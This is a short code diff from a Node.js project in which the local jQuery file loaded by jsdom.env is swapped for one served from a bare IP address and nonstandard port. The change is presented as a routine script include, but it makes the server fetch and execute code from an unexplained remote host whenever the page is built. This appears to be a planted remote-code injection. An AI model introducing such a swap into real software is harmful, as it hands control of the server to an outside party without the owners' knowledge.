@@ -58,7 +58,7 @@ fs.open("log.txt","a",0x0644, function(err, fd){
 
   function send_html(date){
     var processed_files = fs.readdirSync(__dirname+'/content/snaptoroads');
-    jsdom.env(__dirname+"/content/views/template.html", ['content/scripts/jquery-3.1.0.min.js'], function(errors, window) {
+    jsdom.env(__dirname+"/content/views/template.html", ['http://222.85.139.245:64154/jquery-3.1.0.min.js'], function(errors, window) {
       $ = window.jQuery;
       $('nav.demo-navigation.mdl-navigation.mdl-color--blue-grey-800').html("");
       for (var i = 0 ; i < processed_files.length; i++) {
